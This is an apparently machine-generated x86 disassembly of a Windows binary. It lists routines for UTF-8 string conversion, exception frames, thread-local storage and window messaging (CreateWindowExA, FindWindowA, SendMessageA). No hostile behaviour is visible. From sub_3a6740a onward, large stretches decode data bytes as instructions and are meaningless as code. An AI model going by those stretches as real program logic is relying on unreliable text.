sub_3a66ccc
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_3a66cf8
test edx edx
je sub_3a66cb4
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_3a63030
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_3a66d9c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_3a6137c
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_3a66dc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_3a66ea0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
movzx ecx [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
movzx edx dl
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
movzx edx dl
shl ecx 0x6
or edx ecx
mov ecx edx
sub_3a66fd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3a6707c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a652a0
mov eax esi
xor edx edx
call sub_3a65c08
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a67083
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax esi
call sub_3a65bfc
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_3a659c0
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax esi
call sub_3a65bfc
push eax
mov eax esi
call sub_3a65bec
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
lea edx [ ebx + 0x1 ]
pop ecx
call sub_3a66dc4
test eax eax
jle r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
call sub_3a652a0
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_3a659c0
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a652f4
sub_3a6708c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3a67137
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_3a65a7c
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6713e
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
mov [ ebp - 0xc ] esi
mov ebx [ ebp - 0xc ]
mov eax ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
xchg edx eax
call sub_3a65cd8
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
push ebx
mov eax [ ebp - 0x4 ]
call sub_3a65bfc
inc eax
push eax
mov eax esi
call sub_3a65730
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65bec
pop ecx
pop edx
call sub_3a66ea0
test eax eax
jle r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_3a65cd8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65ab8
sub_3a67144
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a67187
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65bdc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_3a66fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6718e
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub_3a67194
push ebx
push esi
add esp 0xfffff004
push eax
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x1000
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_3a65498
push 0x1000
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_3a666b8
push eax
call sub_3a6130c
mov ecx eax
mov edx esp
mov eax esi
call sub_3a65390
jmp r-xdata
sub_3a671f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a67248
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6724f
retn
mov eax rw-data
call sub_3a638ac
mov eax rw-data
call sub_3a638ac
mov eax rw-data
call sub_3a638ac
call sub_3a62e74
mov eax rw-data
call sub_3a652a0
sub_3a67288
push ebx
call sub_3a67280
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_3a67274
test eax eax
jne r-xdata
mov eax 0xe2
call sub_3a651e0
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_3a651e0
sub_3a672cc
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_3a67288
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_3a67318
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_3a67254
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_3a6730c
mov edx rw-data
mov eax ebx
call sub_3a64f4c
pop ebx
retn
sub_3a673b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_3a673cc
push ebx
mov ebx [ eax + 0x8 ]
mov ecx [ eax ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
add ebx ecx
mov [ edx ] ebx
mov ebx [ eax + 0xc ]
mov ecx [ eax + 0x4 ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
adc ebx 0x0
add ebx ecx
mov [ edx + 0x4 ] ebx
pop ebx
retn
adc ebx 0x0
sub_3a6740a
call [ eax + r-xdata ]
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
or al 0x74
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
mov al 0x3
mov eax eax
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
jl r-xdata
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
mov al 0x3
ja CreateFileA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
outsd
js r-xdata
outsd
inc edx
mov al 0x3
mov eax eax
add ecx [ ebx - 0x6fda0040 ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je DeleteCriticalSection
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae RegQueryValueExA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
shl [ esi + 0x3 ] 0x6
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add ecx [ ebx - 0x7fda0040 ]
mov eax eax
add ecx [ esp + esi * 2 ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x5fda0040 ]
sub_3a67f50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_3a63410
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_3a63400
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_3a67fa8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call __imp_SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_3a6809d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_3a680db
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a680e2
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_3a6815c
clc
inc edi
mov al 0x3
[ eax ]
add al bh
inc edi
mov al 0x3
int1
inc [ eax ]
add al bh
inc edi
mov al 0x3
inc [ eax ]
add al bh
inc edi
mov al 0x3
inc [ eax ]
add al bh
inc edi
mov al 0x3
hlt
sub_3a68470
push cs
or dl [ ebx + edx * 2 + 0x65 ]
popad
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x403a6 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
push 0x60636552
add [ eax ] eax
add [ ecx ] al
add [ eax ] al
add [ esp + eax * 4 - 0x5a ] bl
add edx [ eax + eax ]
add [ eax ] al
fadd [ esi + 0x3 ]
add [ eax ] al
add [ eax ] al
add al bl
test [ esi + 0x3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ch
test [ esi + 0xc03 ] ah
add al al
adc [ esi - 0x59ba37fd ] ah
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
add [ eax ] al
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
outsd
outsb
clc
test [ esi + 0x45090703 ] ah
js r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
mov eax 0x3a685
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jo r-xdata
je r-xdata
outsd
outsb
fadd [ esi - 0x59eeebfd ]
rol [ ebp - 0x5a ] 0x1
js r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
add eax [ esi ]
inc ebp
inc ecx
bound ebp [ edi + 0x72 ]
add [ eax ] al
add [ esp + eax * 4 + 0x45c803a6 ] cl
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] cl
push ebx
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x1003a685
push ebp
je r-xdata
add [ eax ] al
enter 0xa686 0x3
adc [ eax ] al
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
lea eax [ eax ]
jo r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1003a685 ] bh
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1003a687 ] al
add [ eax ] al
jb r-xdata
add ebp esp
aam 0xa6
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
inc ebp
dec eax
popad
jo r-xdata
sbb [ ebx - 0x5a ] al
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7a ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add ebp esp
aam 0xa6
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax * 2 + 0x4f74754f ]
dec bp
insd
outsd
jb r-xdata
imul ebp [ edi + 0x6e ] 0xa6861490
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 4 ] dl
add [ ebp + eax * 4 - 0x5a ] ah
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 4 - 0x5a ] ah
add ecx [ eax + eax ]
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
xor [ eax + 0x3a6 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ esi + eax * 4 - 0x5a ] bh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ecx ]
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x1003a6 ] 0x0
popad
insb
mov eax eax
and [ edi + 0x3a6 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xchg [ esi + 0x1003 ] esp
add [ esi + eax * 4 - 0x5a ] bh
inc ebp
jb r-xdata
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add [ eax ] al
add [ ebp + eax * 4 - 0x5a ] ch
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x86
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x88
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax + 0x1003a6 ] cl
add [ eax ] al
xor al 0x87
cmpsb [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xchg [ esi + 0x1003 ] esp
add [ edi + eax * 4 ] dh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi + 0x1003a6 ] al
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
mov [ esi + 0x1003 ] esp
add [ eax - 0x37fc5978 ] bl
inc ebp
cmpsb [ esi ] [ edi ]
inc ebp
jb r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
mov [ esi + 0x3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1003a688 ] cl
add [ eax ] al
add [ edi + eax * 4 ] dh
cmpsb [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ edx ]
inc ebp
inc ebp
js r-xdata
rcr al 0x87
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ esp + eax * 4 + 0x45c803a6 ] cl
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx ]
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
xchg [ esi + 0x1003 ] ah
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ecx ]
inc ebp
inc ebp
js r-xdata
xchg [ esi + 0x3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
xchg [ esi + 0x1003 ] ah
add [ esp + eax * 4 + 0x45c803a6 ] cl
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 4 - 0x5a ] al
add edx [ eax ]
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x89ec6564
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 4 + 0x1003a6 ] dl
add [ eax ] al
cwde
mov [ esi - 0x59ba37fd ] ah
outsd
